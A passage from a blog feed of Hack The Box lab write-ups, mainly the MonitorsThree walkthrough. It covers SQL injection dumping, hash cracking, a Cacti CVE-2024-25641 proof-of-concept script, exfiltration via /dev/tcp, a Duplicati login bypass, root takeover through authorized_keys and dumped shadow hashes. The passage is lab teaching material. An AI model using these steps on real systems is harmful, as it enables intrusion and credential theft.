14406,14130,14128,14118,14126,14127,14125,14122,14123 127.0.0.1</span><br><span class="line">---</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">14118/tcp open  ssl/unknown</span><br><span class="line">14122/tcp open  unknown</span><br><span class="line">14123/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">14125/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">14126/tcp open  http        Apache httpd 2.4.9 ((Win32) PHP/<span class="number">5.5</span>.<span class="number">12</span>)</span><br><span class="line"><span class="number">14127</span>/tcp open  unknown</span><br><span class="line"><span class="number">14128</span>/tcp open  unknown</span><br><span class="line"><span class="number">14130</span>/tcp open  unknown</span><br><span class="line"><span class="number">14406</span>/tcp open  mysql       MySQL <span class="number">5.5</span>.<span class="number">5</span>-<span class="number">10.1</span>.<span class="number">19</span>-MariaDB</span><br></pre></td></tr></table></figure><p>先试试 MySQL</p><img src="/2024/11/13/HTB-Infiltrator/image-20241116123657192.png" class=""><p>这里提示是需要密码的，试一下前面没用上的 <code>MessengerApp@Pass!</code></p><img src="/2024/11/13/HTB-Infiltrator/image-20241116193359013.png" class=""><p>还是不对，再看看几个 HTTP 服务，先看 14123 的</p><img src="/2024/11/13/HTB-Infiltrator/image-20241116193503990.png" class=""><img src="/2024/11/13/HTB-Infiltrator/image-20241116193614297.png" class=""><p>前面发现的 <code>K.turner</code> 用户的备注信息就是 <code>OutPut Messenger</code> 的密码。</p><img src="/2024/11/13/HTB-Infiltrator/image-20241116194231536.png" class=""><p>发现一些聊天记录，但是没啥营养，再看一下另外两个端口</p><img src="/2024/11/13/HTB-Infiltrator/image-20241116194535973.png" class=""><img src="/2024/11/13/HTB-Infiltrator/image-20241116194543660.png" class=""><p>也没什么东西，去搜一下 <code>Output Messenger</code> 相关漏洞</p><img src="/2024/11/13/HTB-Infiltrator/image-20241116123805275.png" class=""><p>可以看到这个 MYSQL 是加载的这个配置文件 <code>C:\Program Files\Output Messenger Server\Plugins\Output\mysql\my.ini</code> </p><img src="/2024/11/13/HTB-Infiltrator/image-20241116123947880.png" class=""><p>但是这个目录没有权限访问，转到 WinPEAS 中可以看到，目录内的某些目录是可以访问的</p><img src="/2024/11/13/HTB-Infiltrator/image-20241116123747034.png" class=""><img src="/2024/11/13/HTB-Infiltrator/image-20241116124041883.png" class=""><p>尝试访问也是失败了，那么找一下这个目录下面有没有什么敏感文件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/2024/11/13/HTB-Infiltrator/Infiltrator.png&quot; class=&quot;&quot;&gt;

&lt;h2 id=&quot;Recon-Enum&quot;&gt;&lt;a href=&quot;#Recon-Enum&quot; class=&quot;headerlink&quot; title=&quot;Recon </summary>
      
    
    
    
    <category term="Machines" scheme="http://fermionorz.github.io/categories/Machines/"/>
    
    <category term="Windows" scheme="http://fermionorz.github.io/categories/Machines/Windows/"/>
    
    <category term="Insane" scheme="http://fermionorz.github.io/categories/Machines/Windows/Insane/"/>
    
    
  </entry>
  
  <entry>
    <title>MonitorsThree</title>
    <link href="http://fermionorz.github.io/2024/11/12/HTB-MonitorsThree/"/>
    <id>http://fermionorz.github.io/2024/11/12/HTB-MonitorsThree/</id>
    <published>2024-11-12T16:00:00.000Z</published>
    <updated>2024-11-18T12:30:51.231Z</updated>
    
    <content type="html"><![CDATA[<img src="/2024/11/12/HTB-MonitorsThree/MonitorsThree.png" class=""><h2 id="Recon-Enum"><a href="#Recon-Enum" class="headerlink" title="Recon &amp; Enum"></a>Recon &amp; Enum</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate 1000 -T4 -sC -sV -O -v [ip]</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE VERSION</span><br><span class="line">22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)</span><br><span class="line">|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)</span><br><span class="line">80/tcp   open     http    nginx 1.18.0 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://monitorsthree.htb/</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="line">8084/tcp filtered websnp</span><br></pre></td></tr></table></figure><h3 id="VHost-Scan"><a href="#VHost-Scan" class="headerlink" title="VHost Scan"></a>VHost Scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://monitorsthree.htb/ -H <span class="string">&quot;Host: FUZZ.monitorsthree.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -fs 13560</span><br><span class="line"></span><br><span class="line">cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 128ms]</span><br></pre></td></tr></table></figure><h3 id="Cewl-Scan"><a href="#Cewl-Scan" class="headerlink" title="Cewl Scan"></a>Cewl Scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w <span class="built_in">log</span>/cewl_monitorsthree_htb.log http://monitorsthree.htb/</span><br></pre></td></tr></table></figure><h2 id="Shell-as-www-data"><a href="#Shell-as-www-data" class="headerlink" title="Shell as www-data"></a>Shell as www-data</h2><ul><li><a href="http://monitorsthree.htb/">http://monitorsthree.htb/</a></li></ul><img src="/2024/11/12/HTB-MonitorsThree/image-20241113085544896.png" class=""><p>查看主页发现登录接口</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113093714893.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster --no-state -u http://monitorsthree.htb/ -X php</span><br></pre></td></tr></table></figure><img src="/2024/11/12/HTB-MonitorsThree/image-20241113095317192.png" class=""><p>目录没发现什么有意思的东西，转到 cacti.monitorsthree.htb 看一下</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113100001041.png" class=""><p>搜索 Cacti 相关漏洞，CVE-2022-46169、CVE-2024-29895</p><p>其中 CVE-2022-46169 测试失败，目前暂时没有凭据，先看一下有没有其他洞，关于 Cacti 后台这里，不打算测试 SQL 注入，因为这个版本不是最新版，而且也没有搜到有 SQL 注入漏洞的相关信息，因此，把重点放在 monitorsthree.htb 的登录窗口中</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113100809830.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113100835895.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113100901602.png" class=""><p>这里明显可以看出，是存在 SQL 注入漏洞的，那么使用自动化工具跑一下</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113101422719.png" class=""><p>Sqlmap 可以识别注入，但是始终跑不出来，换成 ghauri 试一下</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113185800343.png" class=""><p>这里发现了报错注入，那速度将会飞起</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ghauri --batch -r forgot_pass.req --dbs</span><br></pre></td></tr></table></figure><img src="/2024/11/12/HTB-MonitorsThree/image-20241113185951777.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ghauri --batch -r forgot_pass.req -D monitorsthree_db --tables</span><br></pre></td></tr></table></figure><img src="/2024/11/12/HTB-MonitorsThree/image-20241113190007323.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ghauri --batch -r forgot_pass.req -D monitorsthree_db -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure><img src="/2024/11/12/HTB-MonitorsThree/image-20241113190054018.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113190105928.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 0 31a181c8372e3afc59dab863430610e8 /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><img src="/2024/11/12/HTB-MonitorsThree/image-20241113190215922.png" class=""><p>找到管理员密码 Hash，爆破得到管理员密码 <code>greencacti2001</code></p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113155734684.png" class=""><p>根域名的后台可以登录，但是没啥功能点可利用</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113155723183.png" class=""><p>Cacti 的后台也可以登录，找到一个需要认证的 RCE 漏洞 <a href="https://github.com/Cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88">CVE-2024-25641</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$xmldata</span> = <span class="string">&quot;&lt;xml&gt;</span></span><br><span class="line"><span class="string">   &lt;files&gt;</span></span><br><span class="line"><span class="string">       &lt;file&gt;</span></span><br><span class="line"><span class="string">           &lt;name&gt;resource/test.php&lt;/name&gt;</span></span><br><span class="line"><span class="string">           &lt;data&gt;%s&lt;/data&gt;</span></span><br><span class="line"><span class="string">           &lt;filesignature&gt;%s&lt;/filesignature&gt;</span></span><br><span class="line"><span class="string">       &lt;/file&gt;</span></span><br><span class="line"><span class="string">   &lt;/files&gt;</span></span><br><span class="line"><span class="string">   &lt;publickey&gt;%s&lt;/publickey&gt;</span></span><br><span class="line"><span class="string">   &lt;signature&gt;&lt;/signature&gt;</span></span><br><span class="line"><span class="string">&lt;/xml&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$filedata</span> = <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$keypair</span> = <span class="title function_ invoke__">openssl_pkey_new</span>(); </span><br><span class="line"><span class="variable">$public_key</span> = <span class="title function_ invoke__">openssl_pkey_get_details</span>(<span class="variable">$keypair</span>)[<span class="string">&quot;key&quot;</span>]; </span><br><span class="line"><span class="title function_ invoke__">openssl_sign</span>(<span class="variable">$filedata</span>, <span class="variable">$filesignature</span>, <span class="variable">$keypair</span>, OPENSSL_ALGO_SHA256);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$xmldata</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$filedata</span>), <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$filesignature</span>), <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$public_key</span>));</span><br><span class="line"><span class="title function_ invoke__">openssl_sign</span>(<span class="variable">$data</span>, <span class="variable">$signature</span>, <span class="variable">$keypair</span>, OPENSSL_ALGO_SHA256);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;test.xml&quot;</span>, <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;signature&gt;&lt;/signature&gt;&quot;</span>, <span class="string">&quot;&lt;signature&gt;&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$signature</span>).<span class="string">&quot;&lt;/signature&gt;&quot;</span>, <span class="variable">$data</span>));</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat test.xml | gzip -9 &gt; test.xml.gz; rm test.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将上述脚本写入到文件中，执行 <code>php payload.php</code> 会生成一个 test.xml.gz 文件</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113161232967.png" class=""><p>在导入包功能栏这里导入 test.xml.gz 文件</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113161058701.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113161252057.png" class=""><h3 id="Local-Enum"><a href="#Local-Enum" class="headerlink" title="Local Enum"></a>Local Enum</h3><img src="/2024/11/12/HTB-MonitorsThree/image-20241113162430824.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113161850130.png" class=""><p>找到两份 mysql 的连接密码：<code>cactiuser:cactiuser</code>、<code>app_user:php_app_password</code></p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113162553296.png" class=""><p>可以看到有个 <code>marcus</code> 用户</p><h2 id="Shell-as-Marcus"><a href="#Shell-as-Marcus" class="headerlink" title="Shell as Marcus"></a>Shell as Marcus</h2><p>app_user 是主域名下的服务，也就是前面 SQL 注入的数据库，因此这里使用 cactiuser 连接</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113162721510.png" class=""><p>在 cacti 里面找到 这个用户的 Hash，爆破一下</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113162918052.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113163013386.png" class=""><p>拿到密码了，但是无法登录 ssh，好像是设置了只有密钥登录，那么通过 su 来看一下</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113163712991.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113163751559.png" class=""><p>换成密钥就可以登录了</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113164346545.png" class=""><p>查看本地环境，发现两个新端口</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113170246051.png" class=""><p>尝试访问，发现被重定向到登录页面，而且也能看出是 Tiny WebServer 服务，大概有其他数据库。</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113170815560.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113173150235.png" class=""><p>看到 docker-compose.yml 已经把根目录挂载了，那么思路清晰</p><h2 id="Shell-as-Root"><a href="#Shell-as-Root" class="headerlink" title="Shell as Root"></a>Shell as Root</h2><p>可以用 <code>cat CTADPNHLTC.sqlite &gt; /dev/tcp/[ip]/[port]</code> 先下载下来</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113171352404.png" class=""><p>先把 8200 端口代理出来，在 Duplicati-server.sqlite 中发现了一个密码，但是 Base64 解码得到了不可打印字符，这主要是和 Duplicati 的认证方式有关，在这篇文章中可以了解</p><blockquote><p><a href="https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee">https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee</a></p></blockquote><img src="/2024/11/12/HTB-MonitorsThree/image-20241113173427221.png" class=""><p>先把 Server-passphrase 进行 Base64 decode + Hex Encode</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113173542193.png" class=""><p>输入密码，拦截登录请求，获取第一个包的响应</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113173812713.png" class=""><p>直接使用浏览器的 JS 获取 Hash</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> noncedpwd = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA256</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Hex</span>.<span class="title function_">parse</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>.<span class="title function_">parse</span>(<span class="string">&#x27;hmlBOyfckHdB69CIhVh3q/QIXqkio1xWl0iNc3vtDD8=&#x27;</span>) + <span class="string">&#x27;59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a&#x27;</span>)).<span class="title function_">toString</span>(<span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Base64</span>);</span><br></pre></td></tr></table></figure><img src="/2024/11/12/HTB-MonitorsThree/image-20241113173918719.png" class=""><p>放包，在第二个请求包中输入密码，并进行 Url Encode</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113173955965.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113174024836.png" class=""><p>认证成功</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113175600341.png" class=""><p>看到有备份功能，尝试创建新的备份</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113174757707.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113175711170.png" class=""><p>目标位置可以设置为 <code>/source/tmp/</code></p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113174908389.png" class=""><p>源数据选择 <code>/source/root/</code> 目录和 <code>/source/etc/shadow</code> 文件</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113174935332.png" class=""><img src="/2024/11/12/HTB-MonitorsThree/image-20241113175810165.png" class=""><p>得到了三个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">duplicati-xxx.dlist.zip</span><br><span class="line">duplicati-xxx.dblock.zip  </span><br><span class="line">duplicati-xxx.dindex.zip</span><br></pre></td></tr></table></figure><p>首先查看 dlist.zip 压缩包中的 filelist.json 文件，其中记录了所有文件名对应的 Hash</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113180920023.png" class=""><p>可惜没有私钥</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113180950078.png" class=""><p>可以找到 flag 的位置</p><img src="/2024/11/12/HTB-MonitorsThree/image-20241113181034958.png" class=""><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><h2 id="Root-权限"><a href="#Root-权限" class="headerlink" title="Root 权限"></a>Root 权限</h2><p>如何获取 root 权限呢，可以通过 Duplicati 的恢复功能，可以修改 <code>/etc/passwd</code> 也可以直接修改 <code>/root/.ssh/authorized_keys</code></p><ol><li>创建 <code>/source/home/marcus/.ssh/authorized_keys</code> 的备份</li><li>将备份恢复到 <code>/source/root/.ssh/</code> 目录中</li><li>使用 marcus 用户的私钥 ssh 登录即可</li></ol><img src="/2024/11/12/HTB-MonitorsThree/image-20241113184741305.png" class=""><h3 id="Dump-Hash"><a href="#Dump-Hash" class="headerlink" title="Dump Hash"></a>Dump Hash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T<span class="variable">$3TDQ3GS5lSkNwiN4EsxVB</span>/<span class="variable">$Jyu3CWLTQ4mIypw</span>/03JOtPle6vdpaoY/x6J9brbV9P4:19869:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:19861:0:99999:7:::</span><br><span class="line">marcus:$y$j9T$E2hoLeuzugmRkxli4l2tW0<span class="variable">$yW1Z2shW601aB1eqvybmrTri2Z6X6l9Wz5IIhK89Dd2</span>:19861:0:99999:7:::</span><br><span class="line">lxd:!:19861::::::</span><br><span class="line">mysql:!:19861:0:99999:7:::</span><br><span class="line">Debian-snmp:!:19861:0:99999:7:::</span><br><span class="line">dnsmasq:*:19863:0:99999:7:::</span><br><span class="line">_laurel:!:19954::::::</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/2024/11/12/HTB-MonitorsThree/MonitorsThree.png&quot; class=&quot;&quot;&gt;

&lt;h2 id=&quot;Recon-Enum&quot;&gt;&lt;a href=&quot;#Recon-Enum&quot; class=&quot;headerlink&quot; title=&quot;Re</summary>
      
    
    
    
    <category term="Machines" scheme="http://fermionorz.github.io/categories/Machines/"/>
    
    <category term="Linux" scheme="http://fermionorz.github.io/categories/Machines/Linux/"/>
    
    <category term="Medium" scheme="http://fermionorz.github.io/categories/Machines/Linux/Medium/"/>
    
    
    <category term="Vhost" scheme="http://fermionorz.github.io/tags/Vhost/"/>
    
    <category term="SQLi" scheme="http://fermionorz.github.io/tags/SQLi/"/>
    
    <category term="Hashcat" scheme="http://fermionorz.github.io/tags/Hashcat/"/>
    
    <category term="Ghauri" scheme="http://fermionorz.github.io/tags/Ghauri/"/>
    
    <category term="Cacti" scheme="http://fermionorz.github.io/tags/Cacti/"/>
    
    <category term="CVE-2024-25641" scheme="http://fermionorz.github.io/tags/CVE-2024-25641/"/>
    
    <category term="Mysql" scheme="http://fermionorz.github.io/tags/Mysql/"/>
    
    <category term="SSH_Proxy" scheme="http://fermionorz.github.io/tags/SSH-Proxy/"/>
    
    <category term="Duplicati" scheme="http://fermionorz.github.io/tags/Duplicati/"/>
    
  </entry>
  
  <entry>
    <title>Lantern</title>
    <link href="http://fermionorz.github.io/2024/11/11/HTB-Lantern/"/>
    <id>http://fermionorz.github.io/2024/11/11/HTB-Lantern/</id>
    <published>2024-11-11T16:00:00.000Z</published>
    <updated>2024-11-18T12:30:51.199Z</updated>
    
    <content type="html"><![CDATA[<img src="/2024/11/11/HTB-Lantern/Lantern.png" class=""><h2 id="Enum-Recon"><a href="#Enum-Recon" class="headerlink" title="Enum &amp; Recon"></a>Enum &amp; Recon</h2><h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- --min-rate 1000 -T4 -sC -sV -O -oA <span class="built_in">log</span>/nmap -v [ip]</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 80:c9:47:d5:89:f8:50:83:02:5e:fe:53:30:ac:2d:0e (ECDSA)</span><br><span class="line">|_  256 d4:22:cf:fe:b1:00:cb:eb:6d:dc:b2:b4:64:6b:9d:89 (ED25519)</span><br><span class="line">80/tcp   open  http    Skipper Proxy</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD GET OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to http://lantern.htb/</span><br><span class="line">|_http-server-header: Skipper Proxy</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     HTTP/1.0 404 Not Found</span><br><span class="line">|     Content-Length: 207</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:37 GMT</span><br><span class="line">|     Server: Skipper Proxy</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=en&gt;</span><br><span class="line">|     &lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span><br><span class="line">|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Content-Length: 225</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:31 GMT</span><br><span class="line">|     Location: http://lantern.htb/</span><br><span class="line">|     Server: Skipper Proxy</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html lang=en&gt;</span><br><span class="line">|     &lt;title&gt;Redirecting...&lt;/title&gt;</span><br><span class="line">|     &lt;h1&gt;Redirecting...&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=<span class="string">&quot;http://lantern.htb/&quot;</span>&gt;http://lantern.htb/&lt;/a&gt;. If not, click the <span class="built_in">link</span>.</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 200 OK</span><br><span class="line">|     Allow: HEAD, GET, OPTIONS</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Date: Tue, 12 Nov 2024 00:10:31 GMT</span><br><span class="line">|_    Server: Skipper Proxy</span><br><span class="line">3000/tcp open  ppp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: 